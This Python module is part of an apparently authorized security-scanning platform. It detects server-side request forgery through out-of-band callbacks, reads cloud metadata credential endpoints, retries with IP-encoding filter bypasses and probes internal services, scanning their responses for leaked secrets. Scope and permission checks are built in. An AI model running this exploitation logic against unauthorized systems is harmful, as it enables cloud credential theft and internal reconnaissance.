"""
module.py — the SSRF module (Module interface).

Flow, per injectable input (URL parameter, JSON body field, or header):
  * OOB confirmation — inject a unique-token collaborator URL, fetch, and watch
    for a TARGET-originated callback (source-discriminated). Classify full vs
    blind. Scanner unfurls are flagged, not counted.
  * Cloud-metadata escalation — on a full (response-reflected) sink, read cloud
    metadata READ-ONLY (possession proof); if a filter blocks the literal IP,
    try the bypass generator (decimal/hex/etc.). Credentials are NEVER used.
  * Internal-service probing — read benign markers (Actuator heapdump -> regex
    scan for secrets, Redis INFO, ...). Reachability proof only.

Safety: every outbound + every callback target is scope-checked (inherited);
DNS rebinding only toward authorized targets; minimal-impact, read-only proofs;
the module refuses to run unless automated scanning is permitted, and surfaces
programs that forbid SSRF/metadata testing.
"""

from __future__ import annotations

import json
import logging
import re
import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from core.context import PlatformContext
from core.datastore import Finding
from modules.base import Candidate, Module
from modules.ssrf.bypass import ip_encodings
from modules.ssrf.payloads import (
    CLOUD_METADATA,
    INTERNAL_SERVICES,
    SECRET_PATTERNS,
    SSRF_HEADER_VECTORS,
    SSRF_PARAM_NAMES,
)

_SECRET_RES = [(re.compile(p), label) for p, label in SECRET_PATTERNS]


def _inject_query(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q)))


class SsrfModule(Module):
    name = "ssrf"
    description = "Server-Side Request Forgery: OOB confirmation, cloud metadata, internal services."

    def __init__(self, ctx: PlatformContext, logger: logging.Logger | None = None,
                 use_interactsh: bool = False, internal_targets: list[str] | None = None) -> None:
        super().__init__(ctx, logger)
        self.use_interactsh = use_interactsh
        # Internal hosts to probe once SSRF is confirmed (lab default: localhost).
        raw = (ctx.config.raw.get("ssrf", {}) or {})
        self.internal_targets = internal_targets or raw.get("internal_targets", ["127.0.0.1"])
        # Point cloud-metadata tests at a MOCK server (lab safety): if set, the
        # real 169.254.169.254 host in the matrix is rewritten to this address.
        self.metadata_base = raw.get("metadata_base", "")
        self.collab = None

    # -- program-rule surfacing -------------------------------------------
    def setup(self) -> None:
        self.ctx.require_automated_scanning("SSRF scan")
        rules = (self.ctx.config.raw.get("rules", {}) or {})
        if rules.get("ssrf_testing_allowed") is False:
            from core.exceptions import ScanningNotPermittedError
            raise ScanningNotPermittedError(self.ctx.config.name, "SSRF/metadata testing (forbidden by program rules)")
        # Start the OOB collaborator.
        if self.use_interactsh:
            from core.oob import InteractshCollaborator
            self.collab = InteractshCollaborator(
                server=self.ctx.config.callback.interactsh_server, logger=self.log)
        else:
            from core.oob import LocalHttpCollaborator
            self.collab = LocalHttpCollaborator(target_ips=set(self.internal_targets), logger=self.log)
        self.collab.start()

    def teardown(self) -> None:
        if self.collab:
            self.collab.stop()

    # -- candidate generation ---------------------------------------------
    def build_candidates(self) -> list[Candidate]:
        self.ctx.require_automated_scanning("SSRF scan")
        ds, pid = self.ctx.datastore, self.ctx.program_id
        candidates: list[Candidate] = []
        seen: set[tuple] = set()

        def add(url, param, location):
            key = (url.split("?")[0], param, location)
            if key in seen:
                return
            seen.add(key)
            for kind in ("oob", "metadata", "internal"):
                candidates.append(Candidate(self.name, {
                    "kind": kind, "url": url, "param": param, "location": location}))

        # Query params from recon + URLs.
        for row in ds.get_parameters(pid):
            add(row["url"], row["name"], "query")
        for row in ds.get_urls(pid):
            url = row["url"]
            # param guessing: try SSRF-prone names on every URL
            for name in SSRF_PARAM_NAMES[:12]:
                add(url, name, "query")

        # Captured traffic: query + JSON body params + headers.
        for row in ds.get_captured(pid):
            url = row["url"]
            for name, _ in parse_qsl(urlparse(url).query, keep_blank_values=True):
                add(url, name, "query")
            body = row["req_body"] or ""
            if body.strip().startswith("{"):
                try:
                    for k in json.loads(body):
                        add(url, k, "body:" + body)
                except Exception:
                    pass

        self.log.info("Built %d SSRF candidates", len(candidates))
        return candidates

    # -- helpers ----------------------------------------------------------
    def _fetch_with(self, url: str, param: str, location: str, value: str):
        """Inject `value` into the sink and fetch via the scope-guarded engine."""
        if location == "query":
            return self.ctx.http.get(_inject_query(url, param, value))
        if location.startswith("body:"):
            try:
                base = json.loads(location[5:])
            except Exception:
                base = {}
            base[param] = value
            return self.ctx.http.post(url, data=json.dumps(base),
                                      headers={"Content-Type": "application/json"})
        return self.ctx.http.get(url, headers={param: value})  # header vector

    def _poll(self, token: str, attempts: int = 4, delay: float = 0.3):
        hits = []
        for _ in range(attempts):
            self.collab.poll()  # drain into the backend's store
            hits = self.collab.interactions_for(token)
            if hits:
                break
            time.sleep(delay)
        return hits

    def _scan_secrets(self, text: str) -> list[str]:
        out = []
        for rx, label in _SECRET_RES:
            if rx.search(text or ""):
                out.append(label)
        return sorted(set(out))

    # -- candidate tests --------------------------------------------------
    def test_candidate(self, candidate: Candidate) -> list[Finding]:
        d = candidate.data
        kind = d.get("kind")
        if kind == "oob":
            return self._test_oob(d)
        if kind == "metadata":
            return self._test_metadata(d)
        if kind == "internal":
            return self._test_internal(d)
        return []

    def _test_oob(self, d: dict) -> list[Finding]:
        token = self.collab.new_token()
        cb = self.collab.payload_url(token)
        resp = self._fetch_with(d["url"], d["param"], d["location"], cb)
        hits = self._poll(token)
        target_hits = [i for i in hits if i.source_class in ("target", "unknown")]
        scanner_hits = [i for i in hits if i.source_class == "third_party_scanner"]
        full = "recorded" in (resp.text or "")   # our collaborator's reflected signature

        # Persist callbacks (with source-discrimination tag) for the dashboard.
        for i in hits:
            self.ctx.datastore.record_callback(
                self.ctx.program_id, correlation_id=i.correlation_id, interaction=i.protocol,
                source_ip=i.source_ip, origin=f"{i.source_class}: {i.source_detail}",
                raw=i.raw)

        if not target_hits and not full:
            return []
        subtype = "ssrf" if full else "blind-ssrf"
        protocols = sorted({i.protocol for i in target_hits}) or (["http"] if full else [])
        dns_only = protocols == ["dns"]
        return [Finding(
            type="ssrf", subtype=subtype, severity="high" if full else "medium", status="new",
            url=d["url"], parameter=d["param"], context=d["location"].split(":")[0],
            payload=cb, request=resp.request_as_text(), response=resp.response_as_text(),
            title=f"{'Full' if full else 'Blind'} SSRF in '{d['param']}' ({d['location'].split(':')[0]})",
            description=(
                f"Injecting an out-of-band URL into '{d['param']}' caused the server to make "
                f"the request to my collaborator (token {token}). "
                + ("The fetched content is reflected in the response (full SSRF)." if full
                   else "Confirmed via target-originated callback (blind SSRF).")
                + (" DNS-only callback: server-side resolution confirmed but a connection "
                   "filter likely blocks outbound HTTP." if dns_only else "")
                + (f" NOTE: {len(scanner_hits)} third-party link-scanner callback(s) were seen "
                   "and EXCLUDED as false positives." if scanner_hits else "")),
            evidence={"classification": subtype, "cwe": "CWE-918", "callback_token": token,
                      "callback_url": cb, "protocols": protocols, "dns_only": dns_only,
                      "source_classes": [i.source_class for i in hits],
                      "scanner_excluded": len(scanner_hits), "tier": "confirmed" if target_hits else "needs-review"},
        )]

    def _looks_blocked(self, resp) -> bool:
        return resp.status_code in (400, 403) or "block" in (resp.text or "").lower()

    def _meta_url(self, url: str) -> str:
        """Rewrite the metadata host to the mock server when configured (lab safety)."""
        if self.metadata_base:
            return url.replace("169.254.169.254", self.metadata_base).replace(
                "metadata.google.internal", self.metadata_base)
        return url

    def _test_metadata(self, d: dict) -> list[Finding]:
        findings: list[Finding] = []
        for entry in CLOUD_METADATA:
            resp = self._fetch_with(d["url"], d["param"], d["location"], self._meta_url(entry["url"]))
            body = resp.text or ""
            markers = self._metadata_markers(entry, body)
            used_bypass = ""
            if not markers and self._looks_blocked(resp):
                # filter present -> try IP-encoding bypasses of the metadata host
                p = urlparse(entry["url"])
                for tech, host in ip_encodings(p.hostname or ""):
                    bypass_url = urlunparse(p._replace(netloc=host))
                    resp = self._fetch_with(d["url"], d["param"], d["location"], bypass_url)
                    body = resp.text or ""
                    markers = self._metadata_markers(entry, body)
                    if markers:
                        used_bypass = tech
                        break
            if markers:
                secrets = self._scan_secrets(body)
                findings.append(Finding(
                    type="ssrf", subtype="cloud-metadata", severity="critical", status="new",
                    url=d["url"], parameter=d["param"], context=entry["provider"],
                    payload=entry["url"], request=resp.request_as_text(),
                    response=resp.response_as_text(),
                    title=f"Cloud metadata exposure via SSRF: {entry['provider']}"
                          + (f" (filter bypass: {used_bypass})" if used_bypass else ""),
                    description=(
                        f"SSRF reaches {entry['provider']} metadata ({entry['desc']}). The "
                        f"read-only response is captured as POSSESSION PROOF only — the "
                        f"credentials are NOT used, exfiltrated-and-used, or pivoted with."
                        + (f" A filter was bypassed using IP encoding ({used_bypass})." if used_bypass else "")),
                    evidence={"classification": "cloud-metadata", "cwe": "CWE-918",
                              "provider": entry["provider"], "metadata_url": entry["url"],
                              "bypass": used_bypass, "markers": markers, "secrets_seen": secrets,
                              "possession_proof_only": True, "tier": "confirmed"},
                ))
                break  # one metadata finding per sink is plenty
        return findings

    @staticmethod
    def _metadata_markers(entry: dict, body: str) -> list[str]:
        out = []
        for needle in ("AccessKeyId", "SecretAccessKey", "access_token", "ASIA", "AKIA",
                       "security-credentials", "RoleArn", "ssrf-lab-role"):
            if needle in (body or ""):
                out.append(needle)
        return out

    def _test_internal(self, d: dict) -> list[Finding]:
        for svc in INTERNAL_SERVICES:
            for host in self.internal_targets:
                for port in svc["ports"][:4]:
                    confirmed_at = ""
                    secrets: list[str] = []
                    last_resp = None
                    for probe in svc["probes"][:4]:
                        if not probe.startswith("/"):
                            continue  # protocol-specific (Redis INFO) handled elsewhere
                        probe_url = f"http://{host}:{port}{probe}"
                        resp = self._fetch_with(d["url"], d["param"], d["location"], probe_url)
                        body = resp.text or ""
                        # Skip failed fetches (avoid matching markers that leak from the
                        # SSRF app's own JSON response wrapper).
                        if "fetch error" in body.lower() or '"status": 0' in body:
                            continue
                        if svc["marker"] in body:
                            confirmed_at = probe_url
                            last_resp = resp
                        # Accumulate any secrets from EVERY probe (e.g. heapdump).
                        secrets += self._scan_secrets(body)
                    if confirmed_at:
                        secrets = sorted(set(secrets))
                        sev = "critical" if secrets else "high"
                        return [Finding(
                            type="ssrf", subtype="internal-service", severity=sev, status="new",
                            url=d["url"], parameter=d["param"], context=svc["name"],
                            payload=confirmed_at, request=last_resp.request_as_text(),
                            response=last_resp.response_as_text(),
                            title=f"Internal service reachable via SSRF: {svc['name']} ({host}:{port})"
                                  + (" — secrets leaked!" if secrets else ""),
                            description=(
                                f"SSRF reaches internal {svc['name']} at {host}:{port} "
                                f"(benign reachability proof). {svc['note']}"
                                + (f" A scanned endpoint leaked: {', '.join(secrets)}." if secrets else "")),
                            evidence={"classification": "internal-service", "cwe": "CWE-918",
                                      "service": svc["name"], "endpoint": confirmed_at,
                                      "secrets_seen": secrets, "note": svc["note"],
                                      "tier": "confirmed"},
                        )]
        return []
